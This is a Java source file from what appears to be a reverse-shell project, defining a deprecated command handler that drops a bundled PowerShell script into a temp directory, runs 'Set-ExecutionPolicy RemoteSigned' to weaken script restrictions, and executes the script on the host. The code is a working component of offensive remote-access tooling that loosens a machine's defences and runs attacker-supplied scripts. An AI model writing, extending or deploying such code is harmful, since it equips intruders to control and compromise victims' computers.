package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.*;


import java.io.File;


import java.util.ArrayList;
import java.util.List;
/*
* Failed Commands
*
* */
@Deprecated
public class PowerShellScripts implements Command {
    @Override
    public String executeCommand(String command) {
        StringBuilder response = new StringBuilder();
        List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
        String scriptName = null;
        try {
            scriptName = commands.get(1);

            File dir = OSUtil.createDirectoryInTmpFolder(Constants.CUSTOM_SCRIPT_DIRECTORY);

            File script = ResourceClassPathWriterUtil.writeFileFromClassToDir(scriptName,dir);
            if (!allowPowerShellScriptExec(response)){
                response.append("error occurred with enabling powershell script execution");
//                return response.toString();
            }
            SystemCommandUtil.runCommand("powershell "+script.getAbsolutePath());
            response.append("complete");

        }catch (Exception e){
            response.append("Exception occurred while running script: "+ scriptName+" error: " +e.getMessage());
            e.printStackTrace();
        }



        return response.toString();
    }





    private static boolean allowPowerShellScriptExec(StringBuilder response){
        String allowPowerShellExecution = DataManipulationUtil.removeFirstLines(SystemCommandUtil.runCommand("powershell Set-ExecutionPolicy RemoteSigned"),2);
        System.out.println("powershell: "+allowPowerShellExecution);
        response.append(allowPowerShellExecution);

        if(allowPowerShellExecution.contains("denied") || allowPowerShellExecution.toLowerCase().contains("not found")) return false;

        return true;
    }



}
